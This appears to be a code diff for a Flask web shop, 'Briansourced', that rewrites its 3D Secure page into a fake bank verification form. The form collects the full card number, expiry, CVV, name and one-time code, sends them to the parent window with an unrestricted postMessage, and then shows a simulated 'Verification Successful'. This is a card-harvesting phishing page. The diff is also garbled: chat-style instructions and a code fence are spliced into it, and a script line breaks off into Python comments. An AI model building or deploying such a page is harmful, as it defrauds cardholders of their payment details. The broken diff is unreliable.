@@ -1724,6 +1724,10 @@ PAYMENT_ERROR_TEMPLATE = """
 </html>
 """
 
+
+Replace everything from line 1727 to the end of your file with this:
+
+```python
 VERIFICATION_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -1735,297 +1739,254 @@ VERIFICATION_TEMPLATE = """
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary-color: #212529;
-            --secondary-color: #6c757d;
-            --accent-color: #dc3545;
-            --light-color: #f8f9fa;
+            --primary-color: #4e73df;
+            --secondary-color: #858796;
+            --success-color: #1cc88a;
+            --info-color: #36b9cc;
+            --warning-color: #f6c23e;
+            --danger-color: #e74a3b;
+            --light-color: #f8f9fc;
+            --dark-color: #5a5c69;
         }
         
         body {
-            font-family: 'Montserrat', sans-serif;
-            color: var(--primary-color);
-            background-color: var(--light-color);
-        }
-        
-        .navbar {
-            background-color: var(--primary-color);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .navbar-brand {
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: white !important;
+            background-color: #f8f9fc;
+            font-family: 'Nunito', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
         }
         
         .verification-container {
-            max-width: 600px;
+            max-width: 500px;
             margin: 50px auto;
+            padding: 30px;
             background-color: white;
             border-radius: 10px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-            overflow: hidden;
+            box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.15);
         }
         
-        .verification-header {
+        .card-header {
             background-color: var(--primary-color);
             color: white;
+            border-radius: 10px 10px 0 0 !important;
             padding: 20px;
-            text-align: center;
-        }
-        
-        .verification-header h1 {
-            font-weight: 700;
-            margin: 0;
-        }
-        
-        .verification-body {
-            padding: 30px;
-            text-align: center;
-        }
-        
-        .verification-icon {
-            font-size: 4rem;
-            color: var(--primary-color);
-            margin-bottom: 20px;
-        }
-        
-        .verification-title {
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
-        
-        .verification-message {
-            margin-bottom: 30px;
-            color: var(--secondary-color);
-        }
-        
-        .order-info {
-            background-color: var(--light-color);
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 30px;
-            text-align: left;
-        }
-        
-        .order-info h5 {
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-        
-        .order-details {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 5px;
-        }
-        
-        .form-control {
-            border-radius: 0;
-            border: 1px solid #ddd;
-            padding: 12px;
-            text-align: center;
-            font-size: 1.2rem;
-            letter-spacing: 5px;
         }
         
         .form-control:focus {
-            border-color: var(--accent-color);
-            box-shadow: 0 0 0 0.25rem rgba(220, 53, 69, 0.25);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 0.2rem rgba(78, 115, 223, 0.25);
         }
         
         .btn-primary {
-            background-color: var(--accent-color);
-            border: none;
-            padding: 12px 30px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            border-radius: 0;
-            width: 100%;
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
         }
         
         .btn-primary:hover {
-            background-color: #c82333;
+            background-color: #2e59d9;
+            border-color: #2653d4;
         }
         
-        .resend-code {
+        .spinner-border {
+            width: 1.5rem;
+            height: 1.5rem;
+        }
+        
+        .bank-logo {
+            max-width: 120px;
+            max-height: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .security-features {
+            display: flex;
+            justify-content: space-between;
             margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #e3e6f0;
+        }
+        
+        .security-feature {
+            text-align: center;
+            font-size: 0.8rem;
             color: var(--secondary-color);
         }
         
-        .resend-code a {
-            color: var(--accent-color);
-            text-decoration: none;
-            font-weight: 600;
-        }
-        
-        .resend-code a:hover {
-            text-decoration: underline;
-        }
-        
-        .timer {
-            font-weight: 600;
-            color: var(--accent-color);
-        }
-        
-        .security-info {
-            display: flex;
-            justify-content: center;
-            margin-top: 30px;
-            color: var(--secondary-color);
-        }
-        
-        .security-item {
-            display: flex;
-            align-items: center;
-            margin: 0 15px;
-        }
-        
-        .security-item i {
-            margin-right: 5px;
-        }
-        
-        .footer {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 3rem 0 1rem;
-            margin-top: 50px;
+        .security-feature i {
+            font-size: 1.5rem;
+            color: var(--success-color);
+            margin-bottom: 5px;
         }
     </style>
 </head>
 <body>
-    <!-- Navigation -->
-    <nav class="navbar navbar-expand-lg navbar-dark">
-        <div class="container">
-            <a class="navbar-brand" href="/">Briansourced</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item">
-                        <a class="nav-link" href="/">Home</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="/products">Products</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="/support">Support</a>
-                    </li>
-                    <li class="nav-item">
-                        <a class="nav-link" href="/refund">Refunds</a>
-                    </li>
-                </ul>
+    <div class="container">
+        <div class="verification-container">
+            <div class="card-header text-center">
+                <h4 class="mb-0">3D Secure Verification</h4>
+                <p class="mb-0 small">Complete verification to proceed with your payment</p>
             </div>
-        </div>
-    </nav>
-
-    <!-- Verification Container -->
-    <div class="verification-container">
-        <div class="verification-header">
-            <h1>3D Secure Verification</h1>
-        </div>
-        
-        <div class="verification-body">
-            <div class="verification-icon">
-                <i class="fas fa-shield-alt"></i>
-            </div>
-            
-            <h2 class="verification-title">Enter Verification Code</h2>
-            
-            <p class="verification-message">
-                We've sent a 6-digit verification code to your registered mobile device. 
-                Please enter the code below to complete your payment.
-            </p>
-            
-            <div class="order-info">
-                <h5>Order Information</h5>
-                <div class="order-details">
-                    <span>Order ID:</span>
-                    <span>#{{ order_id }}</span>
-                </div>
-                <div class="order-details">
-                    <span>Amount:</span>
-                    <span>£112.98</span>
-                </div>
-                <div class="order-details">
-                    <span>Merchant:</span>
-                    <span>Briansourced</span>
-                </div>
-            </div>
-            
-            <form action="/complete_verification?order_id={{ order_id }}" method="post">
-                <div class="mb-4">
-                    <input type="text" class="form-control" id="code" name="code" placeholder="000000" maxlength="6" required>
+            <div class="card-body p-4">
+                <div class="text-center mb-4">
+                    <img src="https://i.imgur.com/kGxgJdH.png" alt="Bank Logo" class="bank-logo">
+                    <h5 class="mb-1">Secure Payment Verification</h5>
+                    <p class="text-muted small">Your bank requires additional verification</p>
                 </div>
                 
-                <button type="submit" class="btn btn-primary">Verify & Complete Payment</button>
-            </form>
-            
-            <div class="resend-code">
-                <p>Didn't receive a code? <a href="#" id="resend-link">Resend code</a></p>
-                <p class="timer" id="timer">You can request a new code in 60 seconds</p>
-            </div>
-            
-            <div class="security-info">
-                <div class="security-item">
-                    <i class="fas fa-lock"></i> Secure Connection
+                <div class="alert alert-info d-flex align-items-center" role="alert">
+                    <i class="fas fa-info-circle me-2"></i>
+                    <div>
+                        This transaction requires 3D Secure verification. Please enter your verification details below to complete your purchase.
+                    </div>
                 </div>
-                <div class="security-item">
-                    <i class="fas fa-shield-alt"></i> 3D Secure Protection
-                </div>
-                <div class="security-item">
-                    <i class="fas fa-user-shield"></i> Fraud Prevention
+                
+                <form id="verificationForm">
+                    <div class="mb-3">
+                        <label for="cardNumber" class="form-label">Card Number</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="far fa-credit-card"></i></span>
+                            <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="expiryDate" class="form-label">Expiry Date</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="far fa-calendar"></i></span>
+                            <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="cvv" class="form-label">CVV</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                            <input type="text" class="form-control" id="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="cardholderName" class="form-label">Cardholder Name</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="far fa-user"></i></span>
+                            <input type="text" class="form-control" id="cardholderName" placeholder="John Doe" required>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label for="verificationCode" class="form-label">3D Secure Code</label>
+                        <div class="input-group">
+                            <span class="input-group-text"><i class="fas fa-shield-alt"></i></span>
+                            <input type="text" class="form-control" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" required>
+                        </div>
+                        <div class="form-text">Enter the 6-digit code sent to your registered mobile number.</div>
+                    </div>
+                    
+                    <div class="d-grid gap-2">
+                        <button class="btn btn-primary" type="submit" id="verifyButton">
+                            <span id="buttonText">Verify & Complete Payment</span>
+                            <span id="buttonSpinner" class="spinner-border spinner-border-sm ms-2 d-none" role="status" aria-hidden="true"></span>
+                        </button>
+                        <button class="btn btn-outline-secondary" type="button" id="cancelButton">Cancel</button>
+                    </div>
+                </form>
+                
+                <div class="security-features">
+                    <div class="security-feature">
+                        <i class="fas fa-shield-alt"></i>
+                        <div>SSL Encrypted</div>
+                    </div>
+                    <div class="security-feature">
+                        <i class="fas fa-lock"></i>
+                        <div>Secure</div>
+                    </div>
+                    <div class="security-feature">
+                        <i class="fas fa-check-circle"></i>
+                        <div>Verified</div>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-4">
-                    <h5>Briansourced</h5>
-                    <p>Premium UK Streetwear & Designer Fashion</p>
-                </div>
-                <div class="col-md-4">
-                    <h5>Customer Service</h5>
-                    <ul class="list-unstyled">
-                        <li class="mb-2"><a href="/support" class="text-white text-decoration-none">Contact Us</a></li>
-                        <li class="mb-2"><a href="/refund" class="text-white text-decoration-none">Refund Policy</a></li>
-                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Shipping Info</a></li>
-                        <li class="mb-2"><a href="#" class="text-white text-decoration-none">Size Guide</a></li>
-                    </ul>
-                </div>
-                <div class="col-md-4">
-                    <h5>Payment & Security</h5>
-                    <p class="mb-2">All transactions are secure and encrypted.</p>
-                    <p>We accept all major credit and debit cards.</p>
-                </div>
-            </div>
-            <hr class="my-4 bg-light">
-            <div class="text-center">
-                <p class="mb-0">&copy; 2023 Briansourced. All rights reserved.</p>
-            </div>
-        </div>
-    </footer>
-
+    
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Only allow numbers for verification code
-        document.getElementById('code').addEventListener('input', function() {
-            this.value = this.value.replace(/\D/g, '');
+        document.addEventListener('DOMContentLoaded', function() {
+            const verificationForm = document.getElementById('verificationForm');
+            const verifyButton = document.getElementById('verifyButton');
+            const buttonText = document.getElementById('buttonText');
+            const buttonSpinner = document.getElementById('buttonSpinner');
+            const cancelButton = document.getElementById('cancelButton');
+            
+            // Format card number input
+            const cardNumberInput = document.getElementById('cardNumber');
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s/g, '');
+                let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+                e.target.value = formattedValue;
+            });
+            
+            // Format expiry date input
+            const expiryDateInput = document.getElementById('expiryDate');
+            expiryDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                e.target.value = value;
+            });
+            
+            // Only allow numbers for CVV and verification code
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+            
+            document.getElementById('verificationCode').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+            
+            // Handle form submission
+            verificationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Show loading state
+                buttonText.textContent = 'Verifying...';
+                buttonSpinner.classList.remove('d-none');
+                verifyButton.disabled = true;
+                
+                // Get form data
+                const formData = {
+                    cardNumber: document.getElementById('cardNumber').value,
+                    expiryDate: document.getElementById('expiryDate').value,
+                    cvv: document.getElementById('cvv').value,
+                    cardholderName: document.getElementById('cardholderName').value,
+                    verificationCode: document.getElementById('verificationCode').value
+                };
+                
+                // Send data to parent window
+                window.parent.postMessage(formData, '*');
+                
+                // Simulate verification process
+                setTimeout(() => {
+                    buttonText.textContent = 'Verification Successful';
+                    buttonSpinner.classList.add('d-none');
+                    
+                    // Redirect after successful verification
+                    setTimeout(() => {
+                        window.parent.postMessage({verification: 'success'}, '*');
+                    }, 1000);
+                }, 2000);
+            });
+            
+            // Handle cancel button
+            cancelButton.addEventListener('click', function() {
+                window.parent.postMessage({verification: 'cancelled'}, '*');
+            });
         });
-        
-        // Timer for resend code
-        let timeLeft = 60;
-        const timerElement = document.getElementById('timer');
-        const resendLink = document.getElementById('resend-link
-        # Add this import at the top of your file
-import os
+    </script>
+</body>
+</html>
+"""
 
-# Replace the existing app.run() with this code at the bottom of your file:
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+```
